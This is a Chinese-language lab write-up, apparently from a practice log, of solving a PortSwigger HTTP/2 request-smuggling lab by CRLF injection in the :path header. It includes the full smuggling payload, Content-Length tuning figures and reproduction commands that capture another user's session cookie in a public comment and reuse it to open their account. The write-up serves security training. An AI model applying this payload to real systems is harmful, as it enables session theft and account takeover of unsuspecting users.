---
title: "lab-request-smuggling-h2-request-smuggling-via-crlf-injection"
links:
  - target: h2-smuggling-family
    relation: evidences
  - target: request-smuggling-family
    relation: relates
---

# lab-request-smuggling-h2-request-smuggling-via-crlf-injection

> evidences: [[h2-smuggling-family]]

PortSwigger `request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection`
(第 31 批,2026-10-06;批 20 挂组回马)。

- 实例:`https://0ad0002d0339fc4381c13edc002e0023.web-security-academy.net/`
- 判定:**solved**(banner `is-solved` + `Congratulations`;`/my-account` 用偷来的 session 返回 200)。

## 关键步(件 `h2_req`,注入点是 `:path`)

批 20 的卡点(header 名/值内 CRLF)在批 29/31 被 `:path` 绕过 ✓;本 lab 的**偷号手法**不是响应队列投毒,
而是「**让受害者的请求补全我们走私的请求体**」+ 公开评论当存储池:

1. 取我方会话 + csrf(`lab_http get /post?postId=1` → `session=a7etr…`、`csrf=09LdTGx…`)。
2. 发**一条** h2 请求,把整条*未完成*的评论 POST 塞进 `:path`(最后一行不闭合,让前端追加的头落进 body):
   ```
   h2_req <inst> --method GET --path '/post?postId=1 HTTP/1.1\r\nHost: <HOST>\r\n\r\nPOST /post/comment HTTP/1.1\r\nHost: <HOST>\r\nCookie: session=<我方>\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1150\r\n\r\ncsrf=<我方 csrf>&postId=1&name=c&email=a@b.c&comment='
   ```
   - 前端会在我方注入文本之后追加它自己的头块(` HTTP/1.1`、`Host: …`、`Content-Length: 0`,~90B),
     这部分成为 body 的续片;`Content-Length: 1150` 大于当前可用字节(~165B)→ **后端保持连接等字节**。
   - 受害者(每 15s 访问首页)的下一个请求字节拼上来 → body 满 1150 → 评论落库,
     **评论正文 = 受害者的完整请求(含 `cookie:` 头)**。
3. 读 `/post?postId=1` 的评论区 → 拿到
   `cookie: victim-fingerprint=…; secret=…; session=wthNhZTIX29NrlBm0gc3a1NwH7xD78DP; _lab_analytics=…`
4. 把该 session 写进 jar → `lab_http get /my-account`(200)→ `solved_check` true。

## CL 窗口量化

- 评论正文 = **CL − 我方 form data 长度 − 前端追加头块长度** 之后的字节;因此 CL 决定能"看到"受害者请求的多少:
  - CL=600 → 截到 `accept:` 就没了(`Get /` 后 ~410B);
  - CL=950 → 截到 `cookie: …; s`(**刚好差 1 个字符**到 session 值);
  - CL=1150 → 完整拿到 `session=<32>` ✓;
  - CL=1400 → **卡住不落库**(受害者单次请求 ~1130B + 头块 ≈ 1290B < 1400,要等第二次请求上同一后端连接,实际等不到)。
  → 结论:CL 取「我方 form + 头块 + 单次受害者请求头部块大小」的**上界内**;实测该 app 的甜点 ≈ 1150。

## 要点

- 走私请求必须在我方 `Cookie: session=<我方>` + csrf 配对下提交,评论才会落库(受害者的 Cookie 只在 body 文本里 ✓)。
- 受害者请求**必须**落在同一条后端连接上(等到的就是它的字节)⇒ 这类"存文本"手法只在**前端复用后端连接**时成立 ✓。
- 受害者的 `Cookie:` 在头块末尾(`cookie: …` 在 `priority:` 之后),所以 CL 要给足。

## 复现命令

```
lab_http get <inst>/post?postId=1 --jar <jar>            # 取我方 session/csrf
h2_req <inst> --method GET --path '/post?postId=1 HTTP/1.1\r\nHost: <HOST>\r\n\r\nPOST /post/comment HTTP/1.1\r\nHost: <HOST>\r\nCookie: session=<我方>\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1150\r\n\r\ncsrf=<csrf>&postId=1&name=c&email=a@b.c&comment=' --read-ms 3000
sleep 30 && lab_http get '<inst>/post?postId=1&cb=x' --jar <jar>   # 评论区里读受害者 cookie
lab_http get <inst>/my-account --jar <victim-jar>                  # 用偷到的 session
```
